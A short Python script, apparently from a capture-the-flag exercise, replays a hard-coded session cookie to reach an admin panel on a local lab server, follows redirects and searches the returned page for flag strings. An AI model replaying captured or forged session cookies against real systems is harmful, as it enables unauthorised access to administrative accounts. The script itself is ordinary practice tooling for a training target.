import re, sys
import requests

# Test basic connectivity first
test_url = "http://127.0.0.1:33166/"
admin_url = "http://127.0.0.1:33166/admin_panel"
session_cookie = "OHPI_Y1N0-W_1RYNCv342OsWzpNdIqQLP9zIlMlvedk"

print(f"[+] Testing basic connectivity to {test_url}")
try:
    headers = {"User-Agent": "Mozilla/5.0"}
    resp = requests.get(test_url, headers=headers, timeout=10)
    print(f"[+] Base URL reachable - Status: {resp.status_code}")
except Exception as e:
    print(f"[!] Connection test failed: {e}")

# Now fetch admin_panel
print(f"\n[+] Attempting to fetch admin_panel...")

headers = {
    "Cookie": f"session={session_cookie}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

try:
    resp = requests.get(admin_url, headers=headers, timeout=10, verify=False, stream=False)
    
    print(f"[+] Response Status: {resp.status_code}")
    
    if resp.status_code != 200:
        print(f"[!] Expected 200, got {resp.status_code}")
        if resp.status_code in [301, 302, 303, 307, 308]:
            print(f"[+] Redirect Location: {resp.headers.get('Location', 'N/A')}")
            redirect_url = resp.headers.get('Location')
            if redirect_url and not redirect_url.startswith('http'):
                if redirect_url.startswith('/'):
                    redirect_url = f"http://127.0.0.1:33166{redirect_url}"
                else:
                    redirect_url = f"http://127.0.0.1:33166/{redirect_url}"
            
            if redirect_url:
                print(f"[+] Following redirect to: {redirect_url}")
                resp = requests.get(redirect_url, headers=headers, timeout=10, allow_redirects=True)
                print(f"[+] After redirect - Status: {resp.status_code}")
    
    # Get the response content
    content = resp.text
    print(f"\n[+] Content Length: {len(content)} characters")
    print(f"\n[+] Full HTML Content:")
    print("="*80)
    print(content)
    print("="*80)
    
    print(f"\n[+] Searching for FLAG patterns...")
    flag_matches = list(re.finditer(r'FLAG\{[^}]+\}', content))
    
    if flag_matches:
        print(f"[+] FOUND {len(flag_matches)} FLAG pattern(s):")
        for i, match in enumerate(flag_matches, 1):
            flag_value = match.group()
            position = match.start()
            print(f"      {i}. {flag_value} at position {position}")
            
            # Show context
            context_start = max(0, position-40)
            context_end = min(len(content), position+len(flag_value)+40)
            context = content[context_start:context_end]
            print(f"         Context: ...{context}...")
    else:
        print(f"[!] No FLAG patterns found")
        
    # Check for any flag-like patterns
    print(f"\n[+] Checking for alternative flag patterns...")
    alt_patterns = [
        ("case-insensitive", r'[Ff][Ll][Aa][Gg]\{[^}]+\}'),
        ("flag array", r'flag\[[^\]]+\]'),
        ("flag param", r'flag:\s*[^<\s]+'),
    ]
    
    for name, pattern in alt_patterns:
        matches = list(re.finditer(pattern, content))
        if matches:
            print(f"[+] Found {len(matches)} {name} pattern(s):")
            for match in matches[:3]:  # Show first 3
                print(f"    - {match.group()} at position {match.start()}")
    
except requests.exceptions.ConnectionError as e:
    print(f"[!] Connection Error: {e}", file=sys.stderr)
    sys.exit(1)
except Exception as e:
    print(f"[!] Unexpected Error: {e}", file=sys.stderr)
    import traceback
    traceback.print_exc()
    sys.exit(1)
